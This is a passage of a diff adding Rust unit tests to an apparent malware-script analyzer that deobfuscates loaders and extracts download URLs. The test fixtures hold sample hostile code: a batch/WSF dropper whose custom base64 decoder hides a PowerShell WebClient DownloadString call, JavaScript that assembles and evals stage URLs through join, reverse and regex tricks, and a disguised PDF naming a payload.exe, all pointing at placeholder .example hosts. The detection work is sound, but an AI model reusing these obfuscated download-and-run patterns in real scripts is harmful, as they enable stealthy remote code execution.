+                    for (x = 0; x < o.length; x++) {{
+                        c = e[o.charAt(x)];
+                        b = (b << 6) + c;
+                        l += 6;
+                        while (l >= 8) {{ r += w((b >>> (l -= 8)) % 256); }}
+                    }}
+                }}
+                return r;
+            }}
+            </script>
+            "#
+        );
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://custom-b64-ps-js.example/stage"
+            ) || matches!(t,
+                Trait::UrlVariable { url, .. } if url == "https://custom-b64-ps-js.example/stage"
+            ) || matches!(t,
+                Trait::DownloadInDeobText { src, .. } if src == "https://custom-b64-ps-js.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "decoded JS PowerShell payload URL missed: {:?}\ndeob:\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn js_custom_base64_decoder_callbyname_powershell_payload_emits_download() {
+        let payload = concat!(
+            "powershell ",
+            "$tty55='(New-','Obje','ct Ne','t.We','bCli','ent)';",
+            "$tty=iex($tty55 -join '');",
+            "$rot='Down','load','Str','ing';",
+            "$rotJ=($rot -join '');",
+            "$bnt='https','://callbyname-wsf.example','/stage.txt';",
+            "$bntJ=($bnt -join '');",
+            "$mv=[Microsoft.VisualBasic.Interaction]::CallByname($tty,$rotJ,[Microsoft.VisualBasic.CallType]::Method,$bntJ);",
+        );
+        let encoded = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, payload);
+        let script = format!(
+            r#"
+            @echo off
+            cscript //nologo "%~f0?.wsf"
+            exit /b
+            <script language="JScript">
+            var oo = decode("{encoded}");
+            var r = new ActiveXObject("WScript.Shell");
+            r.Run(oo, 0);
+            function decode(s) {{
+                var e = {{}}, i, v = [], r = '', w = String.fromCharCode;
+                var n = [[65,91],[97,123],[48,58],[43,44],[47,48]];
+                for (z in n) {{ for (i = n[z][0]; i < n[z][1]; i++) {{ v.push(w(i)); }} }}
+                for (i = 0; i < 64; i++) {{ e[v[i]] = i; }}
+                for (i = 0; i < s.length; i += 72) {{
+                    var b = 0, c, x, l = 0, o = s.substring(i, i + 72);
+                    for (x = 0; x < o.length; x++) {{
+                        c = e[o.charAt(x)];
+                        b = (b << 6) + c;
+                        l += 6;
+                        while (l >= 8) {{ r += w((b >>> (l -= 8)) % 256); }}
+                    }}
+                }}
+                return r;
+            }}
+            </script>
+            "#
+        );
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://callbyname-wsf.example/stage.txt"
+            )
+        });
+        assert!(
+            has,
+            "decoded JS CallByName PowerShell payload URL was not typed as Download: {:?}\ndeob:\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
     fn js_split_reverse_join_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let js =
@@ -13460,6 +31940,138 @@ mod js_url_extraction_tests {
             )
         });
         assert!(has, "JS Array(...) join URL missed: {:?}", env.traits);
+    }
+
+    #[test]
+    fn js_array_of_join_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"var u = Array.of("https://", "js-array-of.example", "/stage").join(""); eval(u)"#
+                .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://js-array-of.example/stage"
+            )
+        });
+        assert!(has, "JS Array.of(...) join URL missed: {:?}", env.traits);
+    }
+
+    #[test]
+    fn js_array_from_array_join_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"var u = Array.from(["https://", "js-array-from-array.example", "/stage"]).join(""); eval(u)"#
+                .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://js-array-from-array.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "JS Array.from([...]) join URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_array_concat_join_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"var u = ["https://"].concat(["js-array-concat.example"], ["/stage"]).join(""); eval(u)"#
+                .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://js-array-concat.example/stage"
+            )
+        });
+        assert!(has, "JS array concat/join URL missed: {:?}", env.traits);
+    }
+
+    #[test]
+    fn js_array_filter_boolean_join_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"var u = ["https://", "", "js-array-filter.example", "", "/stage"].filter(Boolean).join(""); eval(u)"#
+                .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://js-array-filter.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "JS array filter(Boolean)/join URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_array_filter_identity_function_join_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"var u = ["https://", "", "js-array-filter-fn.example", "", "/stage"].filter(function(part){ return part; }).join(""); eval(u)"#
+                .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://js-array-filter-fn.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "JS array filter(function identity)/join URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_array_filter_identity_arrow_join_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"var u = ["https://", "", "js-array-filter-arrow.example", "", "/stage"].filter(part => part).join(""); eval(u)"#
+                .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://js-array-filter-arrow.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "JS array filter(identity arrow)/join URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_array_join_split_reverse_join_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"var u = ["egats/", "elpmaxe.ver-rts-yarra-sj", "//:sptth"].join("").split("").reverse().join(""); eval(u)"#
+                .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://js-array-str-rev.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "JS array join split/reverse/join URL missed: {:?}",
+            env.traits
+        );
     }
 
     #[test]
@@ -13597,6 +32209,25 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_regex_replace_case_insensitive_binding_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var u = "HXXP://js-regex-replace-i.example/stage".replace(/hxxp/ig, "http"); eval(u)"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://js-regex-replace-i.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "JS case-insensitive regex replace URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_single_quoted_string_concat_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let js = br#"var url = 'https://' + 'single.example' + '/stage'; eval(url)"#.to_vec();
@@ -13650,7 +32281,7 @@ mod cmd_path_flags_tests {
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod disguised_binary_tests {
-    use super::{detect_disguised_binary, looks_like_pe};
+    use super::{analyze, detect_disguised_binary, looks_like_pe, Config, Trait};
 
     #[test]
     fn cab_magic_recognized_as_disguised() {
@@ -13707,6 +32338,34 @@ mod disguised_binary_tests {
     }
 
     #[test]
+    fn analyze_disguised_pdf_recovers_blob_and_scans_urls() {
+        let mut buf = b"%PDF-1.7\n".to_vec();
+        buf.extend_from_slice(b"stream http://pdf-disguised.example/payload.exe endstream\n");
+
+        let report = analyze(&buf, &Config::default());
+
+        assert!(report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::DisguisedBinary { format, size }
+                    if format == "pdf" && *size == buf.len() as u64
+            )
+        }));
+        assert!(report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::DownloadInDeobText { src, line_hint }
+                    if src == "http://pdf-disguised.example/payload.exe"
+                        && line_hint == "binary-input"
+            )
+        }));
+        assert_eq!(report.recovered_pe.len(), 1);
+        assert_eq!(report.recovered_pe[0].0, "disguised-pdf-input");
+        assert_eq!(report.recovered_pe[0].1, buf);
+        assert!(report.deobfuscated.is_empty());
+    }
+
+    #[test]
     fn plain_batch_script_is_not_disguised() {
         // Negative case — actual batch script shouldn't match.
         let script = b"@echo off\r\nset X=1\r\necho %X%\r\n";
@@ -13720,5 +32379,25 @@ mod disguised_binary_tests {
         assert_eq!(detect_disguised_binary(b""), None);
         assert_eq!(detect_disguised_binary(b"MSCF"), None);
         assert_eq!(detect_disguised_binary(b"PK\x03\x04"), None);
+    }
+}
+
+#[cfg(test)]
+#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
+mod ps1_payload_normalization_tests {
+    use super::normalize_extracted_ps1_payloads;
+
+    #[test]
+    fn duplicate_payloads_preserve_one_to_one_normalized_outputs() {
+        let payload = br#"$u = "hxxp://example.test/a";"#.to_vec();
+        let other = br#"$v = "hxxp://example.test/b";"#.to_vec();
+        let payloads = vec![payload.clone(), other, payload];
+
+        let normalized =
+            normalize_extracted_ps1_payloads(&payloads, &std::collections::HashMap::new());
+
+        assert_eq!(normalized.len(), payloads.len());
+        assert_eq!(normalized[0], normalized[2]);
+        assert_ne!(normalized[0], normalized[1]);
     }
 }
